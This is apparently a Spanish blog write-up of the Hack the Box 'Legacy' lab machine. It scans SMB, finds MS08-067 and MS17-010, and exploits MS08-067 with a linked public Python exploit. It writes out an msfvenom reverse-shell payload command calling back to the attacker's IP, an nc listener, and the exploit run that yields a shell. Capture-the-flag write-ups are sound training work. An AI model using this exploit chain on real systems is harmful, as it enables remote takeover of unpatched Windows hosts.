---
layout: single
title: Legacy - Hack the Box (Español)
date: 2021-05-10
classes: wide
header:
  teaser: /assets/images/legacy-writeup/legacy_logo.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - HTB
  - SMB vulnerability
---

# Solucion de la maquina Legacy de Hack the Box



escaneo de puertos :

```
> nmap -Pn --top-ports 1000 10.10.10.4

PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
```



Intentamos con los scripts de nmap para identificar vulnerabilidades en smb :

```
> nmap -Pn --script vuln -p445 10.10.10.4 

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

Puedo usar ms17-010 pero decido usar ms08-067, utilice este exploit (https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py).

En caso no desee usar este por ser mas complejo que el de metasploit es libre de usar el de metasploit el resultado es el mismo.

Ahora cree mi reverse shell con este payload :

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

la salida la colocamos dentro del exploit en python.

Iniciamos un oyente con :

```
sudo nc -lvnp 443
```

Ahora el unico problema del exploit seria que tenemos que adivinar cual es la version del sistema intentando del 1 al 7, yo utilize la numero 6 :

```
python ms08-067.py 10.10.10.4 6 445

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

Con esto ya recibiriamos una conexion en nuestro oyente y ya solo tendriamos que buscar las flags :

```
C:\Documents and Settings>dir /s "user.txt"
dir /s "user.txt"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19                 32 user.txt

C:\Documents and Settings>dir /s "root.txt"
dir /s "root.txt"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  08:18                 32 root.txt
```




